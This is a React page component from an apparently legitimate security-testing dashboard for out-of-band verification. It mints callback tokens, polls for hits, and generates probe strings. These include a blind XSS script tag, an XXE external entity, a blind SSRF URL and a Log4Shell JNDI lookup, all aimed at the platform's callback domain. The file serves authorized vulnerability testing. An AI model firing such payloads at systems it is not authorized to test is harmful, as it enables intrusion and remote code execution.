import React, { useCallback, useEffect, useMemo, useState } from 'react'
import { Link } from 'react-router-dom'
import { useTranslation } from 'react-i18next'
import { Radio, RefreshCw, Zap, ExternalLink } from 'lucide-react'
import { createColumnHelper } from '@tanstack/react-table'
import PageShell from './PageShell'
import ShellScanActions from '../components/engine/ShellScanActions'
import WeissmanListToolbar from '../components/engine/WeissmanListToolbar'
import { useFindingsWorkbench } from '../hooks/useFindingsWorkbench'
import EmptyState from '../components/ui/EmptyState'
import CopyButton from '../components/ui/CopyButton'
import DataTable from '../components/ui/DataTable'
import { apiFetch } from '../lib/apiBase'

const columnHelper = createColumnHelper()

const PROBE_TYPE_KEYS = [
  { id: 'generic', key: 'probe_generic' },
  { id: 'blind_ssrf', key: 'probe_blind_ssrf' },
  { id: 'blind_xss', key: 'probe_blind_xss' },
  { id: 'blind_xxe', key: 'probe_blind_xxe' },
  { id: 'log4shell', key: 'probe_log4shell' },
]

function injectionPayload(probeType, callbackDomain) {
  if (!callbackDomain) return ''
  const host = callbackDomain.trim()
  switch (probeType) {
    case 'blind_ssrf':
      return `http://${host}/ssrf-probe`
    case 'blind_xss':
      return `<script src="https://${host}/x.js"></script>`
    case 'blind_xxe':
      return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${host}/xxe">]><foo>&xxe;</foo>`
    case 'log4shell':
      return `\${jndi:ldap://${host}/a}`
    default:
      return `https://${host}/`
  }
}

export default function OobVerification() {
  const { t } = useTranslation()
  const [targetUrl, setTargetUrl] = useState('')
  const [probeType, setProbeType] = useState('generic')
  const [label, setLabel] = useState('')
  const [minting, setMinting] = useState(false)
  const [polling, setPolling] = useState(false)
  const [probe, setProbe] = useState(null)
  const [error, setError] = useState('')
  const [callbacks, setCallbacks] = useState([])
  const [autoPoll, setAutoPoll] = useState(true)
  const [recentHits, setRecentHits] = useState([])

  const canMint = useMemo(() => !!String(targetUrl || '').trim(), [targetUrl])

  const payload = useMemo(
    () => injectionPayload(probeType, probe?.callback_domain),
    [probeType, probe?.callback_domain],
  )

  const mint = useCallback(async () => {
    if (!canMint) return
    setMinting(true)
    setError('')
    setCallbacks([])
    try {
      const r = await apiFetch('/api/oast/probe', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          target_url: targetUrl.trim(),
          probe_type: probeType,
          label: label.trim() || undefined,
        }),
      })
      const data = await r.json().catch(() => ({}))
      if (!r.ok) throw new Error(data?.error || data?.detail || t('pages.oobVerification.mint_failed'))
      setProbe(data)
      setAutoPoll(true)
    } catch (e) {
      setError(e.message || t('pages.oobVerification.mint_failed'))
    } finally {
      setMinting(false)
    }
  }, [canMint, targetUrl, probeType, label, t])

  const poll = useCallback(async () => {
    const token = probe?.token
    if (!token) return
    setPolling(true)
    try {
      const [verifyRes, cbRes] = await Promise.all([
        apiFetch(`/api/oast/verify/${token}`),
        apiFetch('/api/oast/callbacks'),
      ])
      const data = await verifyRes.json().catch(() => ({}))
      if (!verifyRes.ok) throw new Error(data?.error || data?.detail || t('pages.oobVerification.poll_failed'))
      setProbe((prev) => ({ ...(prev || {}), ...data }))

      if (cbRes.ok) {
        const cbData = await cbRes.json().catch(() => ({}))
        const all = Array.isArray(cbData.callbacks) ? cbData.callbacks : []
        setRecentHits(all.slice(0, 20))
        setCallbacks(all.filter((c) => c.interaction_token === token))
      }
    } catch (e) {
      setError(e.message || t('pages.oobVerification.poll_failed'))
    } finally {
      setPolling(false)
    }
  }, [probe?.token, t])

  useEffect(() => {
    if (!probe?.token || !autoPoll) return undefined
    poll()
    const id = setInterval(poll, 5000)
    return () => clearInterval(id)
  }, [probe?.token, autoPoll, poll])

  const listFindings = useMemo(() => callbacks.map((c, i) => ({
    id: c.id || i,
    severity: 'medium',
    title: c.remote_addr || c.method || 'callback',
    type: probeType,
    description: c.user_agent || c.path || '',
    resource: c.received_at || '',
  })), [callbacks, probeType])

  const recentListFindings = useMemo(() => recentHits.map((c, i) => ({
    id: c.id || `recent-${i}`,
    severity: 'info',
    title: c.source_ip || c.channel || 'callback',
    type: c.probe_type || c.channel || 'callback',
    description: c.payload || c.http_method || '',
    resource: c.timestamp || '',
  })), [recentHits])

  const {
    exportCsv,
    filteredFindings,
    searchQuery,
    setSearchQuery,
  } = useFindingsWorkbench([...listFindings, ...recentListFindings], {
    csvPrefix: 'weissman-oob-callbacks',
    haystackFn: (f) => `${f.title} ${f.type} ${f.description} ${f.resource}`,
  })

  const visibleCallbacks = useMemo(() => {
    if (!searchQuery.trim()) return callbacks
    const ids = new Set(filteredFindings.map((f) => String(f.id)))
    return callbacks.filter((c, i) => ids.has(String(c.id || i)))
  }, [callbacks, filteredFindings, searchQuery])

  const visibleRecentHits = useMemo(() => {
    if (!searchQuery.trim()) return recentHits
    const ids = new Set(filteredFindings.map((f) => String(f.id)))
    return recentHits.filter((c, i) => ids.has(String(c.id || `recent-${i}`)))
  }, [recentHits, filteredFindings, searchQuery])

  const recentHitsColumns = useMemo(() => [
    columnHelper.accessor('timestamp', {
      header: t('pages.oobVerification.col_time'),
      cell: (ctx) => {
        const ts = ctx.getValue()
        return (
          <span className="text-[var(--text-tertiary)] whitespace-nowrap">
            {ts ? new Date(ts).toLocaleString() : '—'}
          </span>
        )
      },
    }),
    columnHelper.accessor('channel', {
      header: t('pages.oobVerification.col_channel'),
      cell: (ctx) => <span className="text-cyan-300/70">{ctx.getValue()}</span>,
    }),
    columnHelper.accessor('source_ip', {
      header: t('pages.oobVerification.col_source'),
      cell: (ctx) => <span className="text-[var(--text-tertiary)]">{ctx.getValue() || '—'}</span>,
    }),
    columnHelper.accessor('payload', {
      header: t('pages.oobVerification.col_payload'),
      cell: (ctx) => (
        <span className="text-[var(--text-muted)] truncate max-w-xs block">{ctx.getValue() || '—'}</span>
      ),
    }),
  ], [t])

  return (
    <PageShell
      title={t('pages.oobVerification.title')}
      badge={t('pages.oobVerification.badge')}
      badgeColor="#22d3ee"
      subtitle={t('pages.oobVerification.subtitle')}
      actions={(
        <div className="flex items-center gap-2">
          {probe?.token && (
            <button
              type="button"
              onClick={() => setAutoPoll((v) => !v)}
              className={`px-3 py-1.5 rounded-lg border text-xs font-mono ${
                autoPoll ? 'border-emerald-500/40 text-emerald-300 bg-emerald-500/10' : 'border-[var(--border-default)] text-[var(--text-tertiary)]'
              }`}
            >
              <Radio className={`w-3 h-3 inline mr-1 ${autoPoll ? 'animate-pulse' : ''}`} />
              {autoPoll ? t('pages.oobVerification.auto_poll_on') : t('pages.oobVerification.auto_poll_off')}
            </button>
          )}
          <Link to="/oast" className="flex items-center gap-1 text-xs font-mono text-cyan-300/80 hover:text-cyan-200">
            <ExternalLink className="w-3.5 h-3.5" />
            {t('pages.oobVerification.full_dashboard')}
          </Link>
          <ShellScanActions
            onRefresh={poll}
            onExport={exportCsv}
            refreshLoading={polling}
            exportDisabled={!filteredFindings.length}
          />
        </div>
      )}
    >
      <div className="space-y-6">
        <div className="rounded-xl border border-cyan-500/20 bg-cyan-950/20 px-4 py-3 text-xs text-cyan-100/70">
          {t('pages.oobVerification.evidence_notice')}
        </div>

        {error && (
          <div className="rounded-xl border border-rose-500/30 bg-rose-950/30 px-4 py-3 text-sm text-rose-200">
            {error}
          </div>
        )}

        <div className="grid grid-cols-1 xl:grid-cols-2 gap-8">
          <div className="rounded-2xl bg-[var(--bg-2)] backdrop-blur-md border border-[var(--border-default)] p-5 space-y-4">
            <div>
              <h3 className="text-xs font-mono text-[var(--text-tertiary)] uppercase tracking-widest">
                {t('pages.oobVerification.mint_token')}
              </h3>
              <p className="text-[11px] text-[var(--text-disabled)] mt-1">{t('pages.oobVerification.mint_body')}</p>
            </div>

            <div className="space-y-3">
              <input
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder={t('pages.oobVerification.target_placeholder')}
                className="w-full rounded-xl bg-white/5 border border-[var(--border-default)] px-3 py-2 text-[12px] text-[var(--text-secondary)] placeholder-white/20 focus:outline-none focus:border-cyan-500/40"
              />
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <select
                  value={probeType}
                  onChange={(e) => setProbeType(e.target.value)}
                  className="rounded-xl bg-[var(--scrim)] border border-[var(--border-default)] px-3 py-2 text-[12px] text-[var(--text-secondary)] focus:outline-none focus:border-cyan-500/40"
                >
                  {PROBE_TYPE_KEYS.map((p) => (
                    <option key={p.id} value={p.id}>{t(`pages.oobVerification.${p.key}`)}</option>
                  ))}
                </select>
                <input
                  value={label}
                  onChange={(e) => setLabel(e.target.value)}
                  placeholder={t('pages.oobVerification.label_optional')}
                  className="rounded-xl bg-white/5 border border-[var(--border-default)] px-3 py-2 text-[12px] text-[var(--text-secondary)] placeholder-white/20 focus:outline-none focus:border-cyan-500/40"
                />
              </div>

              <button
                type="button"
                disabled={!canMint || minting}
                onClick={mint}
                className="w-full rounded-xl border border-cyan-500/30 text-cyan-300/70 text-[12px] font-mono uppercase px-4 py-2 hover:bg-cyan-950/30 disabled:opacity-40 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2"
              >
                <Zap className="w-3.5 h-3.5" />
                {minting ? t('pages.oobVerification.minting') : t('pages.oobVerification.mint_oob')}
              </button>
            </div>
          </div>

          <div className="rounded-2xl bg-[var(--bg-2)] backdrop-blur-md border border-[var(--border-default)] p-5 space-y-4">
            <div className="flex items-center justify-between gap-3">
              <div>
                <h3 className="text-xs font-mono text-[var(--text-tertiary)] uppercase tracking-widest">
                  {t('pages.oobVerification.verification_heading')}
                </h3>
                <p className="text-[11px] text-[var(--text-disabled)] mt-1">{t('pages.oobVerification.verification_body')}</p>
              </div>
              {probe?.token && (
                <button
                  type="button"
                  disabled={polling}
                  onClick={poll}
                  className="flex items-center gap-1 text-[10px] font-mono border border-[var(--border-default)] text-[var(--text-tertiary)] hover:text-white px-2 py-1 rounded"
                >
                  <RefreshCw className={`w-3 h-3 ${polling ? 'animate-spin' : ''}`} />
                  {polling ? t('pages.oobVerification.polling') : t('pages.oobVerification.poll_btn')}
                </button>
              )}
            </div>

            {!probe?.token ? (
              <EmptyState
                icon="radar"
                title={t('pages.oobVerification.mint_empty_title')}
                body={t('pages.oobVerification.mint_begin')}
                compact
              />
            ) : (
              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-3">
                  <StatBox
                    label={t('pages.oobVerification.status')}
                    value={probe.oob_confirmed ? t('pages.oobVerification.hit_confirmed') : t('pages.oobVerification.not_verified')}
                    confirmed={probe.oob_confirmed}
                  />
                  <StatBox
                    label={t('pages.oobVerification.hits_label')}
                    value={String(probe.hit_count ?? 0)}
                    confirmed={probe.hit_count > 0}
                  />
                </div>

                <div className="rounded-xl border border-[var(--border-default)] bg-white/5 p-4 space-y-3">
                  <FieldRow label={t('pages.oobVerification.token_label')} value={probe.token} copy />
                  <FieldRow label={t('pages.oobVerification.callback_domain')} value={probe.callback_domain || '—'} copy />
                  {probe.callback_url && (
                    <FieldRow label={t('pages.oobVerification.callback_url')} value={probe.callback_url} copy />
                  )}
                  {probe.first_hit_at && (
                    <div className="text-[10px] text-green-400/70">
                      {t('pages.oobVerification.first_hit', { time: new Date(probe.first_hit_at).toLocaleString() })}
                    </div>
                  )}
                </div>

                {payload && (
                  <div className="rounded-xl border border-amber-500/20 bg-amber-950/20 p-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="text-[10px] font-mono uppercase text-amber-300/70">
                        {t('pages.oobVerification.injection_hint')}
                      </div>
                      <CopyButton value={payload} />
                    </div>
                    <pre className="text-[11px] font-mono text-amber-100/80 whitespace-pre-wrap break-all">{payload}</pre>
                  </div>
                )}

                {callbacks.length > 0 && (
                  <div>
                    <WeissmanListToolbar
                      className="mb-2"
                      searchQuery={searchQuery}
                      onSearchChange={setSearchQuery}
                      resultCount={visibleCallbacks.length}
                      totalCount={callbacks.length}
                    />
                    <div className="text-[10px] font-mono uppercase text-[var(--text-muted)] mb-2">
                      {t('pages.oobVerification.callbacks_for_token', { count: visibleCallbacks.length })}
                    </div>
                    {visibleCallbacks.length === 0 ? (
                      <EmptyState
                        icon="search"
                        title={t('weissmanFindings.filtered_title')}
                        body={t('weissmanFindings.filtered_body')}
                        compact
                      />
                    ) : (
                    <div className="space-y-2 max-h-48 overflow-y-auto">
                      {visibleCallbacks.map((cb) => (
                        <div key={cb.id} className="rounded-lg border border-emerald-500/20 bg-emerald-950/20 p-3 text-[11px] font-mono">
                          <div className="flex justify-between text-emerald-300/80 mb-1">
                            <span>{cb.channel} · {cb.probe_type}</span>
                            <span className="text-[var(--text-muted)]">{cb.timestamp ? new Date(cb.timestamp).toLocaleString() : ''}</span>
                          </div>
                          <div className="text-[var(--text-tertiary)] truncate">{cb.source_ip || '—'} · {cb.payload || cb.http_method || '—'}</div>
                          {cb.user_agent && <div className="text-[var(--text-muted)] truncate mt-1">{cb.user_agent}</div>}
                        </div>
                      ))}
                    </div>
                    )}
                  </div>
                )}

                <p className="text-[11px] text-[var(--text-muted)]">{t('pages.oobVerification.report_note')}</p>
              </div>
            )}
          </div>
        </div>

        {recentHits.length > 0 && (
          <section className="rounded-2xl border border-[var(--border-default)] bg-[var(--bg-2)] p-5">
            <WeissmanListToolbar
              className="mb-4"
              searchQuery={searchQuery}
              onSearchChange={setSearchQuery}
              resultCount={visibleRecentHits.length}
              totalCount={recentHits.length}
            />
            <h3 className="text-xs font-mono uppercase tracking-widest text-[var(--text-muted)] mb-4">
              {t('pages.oobVerification.tenant_callbacks_heading')}
            </h3>
            {visibleRecentHits.length === 0 ? (
              <EmptyState
                icon="search"
                title={t('weissmanFindings.filtered_title')}
                body={t('weissmanFindings.filtered_body')}
                compact
              />
            ) : (
            <DataTable
              columns={recentHitsColumns}
              data={visibleRecentHits}
              animateRows={false}
              getRowId={(cb) => cb.id}
              getRowAccentColor={(cb) => (cb.interaction_token === probe?.token ? '#10b981' : undefined)}
            />
            )}
          </section>
        )}
      </div>
    </PageShell>
  )
}

function StatBox({ label, value, confirmed }) {
  return (
    <div className={`rounded-xl border p-3 text-center ${confirmed ? 'border-emerald-500/30 bg-emerald-950/20' : 'border-[var(--border-default)] bg-white/5'}`}>
      <div className="text-[10px] font-mono uppercase text-[var(--text-muted)]">{label}</div>
      <div className={`text-sm font-bold mt-1 ${confirmed ? 'text-emerald-300' : 'text-[var(--text-tertiary)]'}`}>{value}</div>
    </div>
  )
}

function FieldRow({ label, value, copy }) {
  return (
    <div>
      <div className="flex items-center justify-between mb-0.5">
        <span className="text-[10px] font-mono text-[var(--text-muted)]">{label}</span>
        {copy && value && value !== '—' && <CopyButton value={value} />}
      </div>
      <div className="text-[11px] font-mono text-cyan-400/80 break-all">{value}</div>
    </div>
  )
}
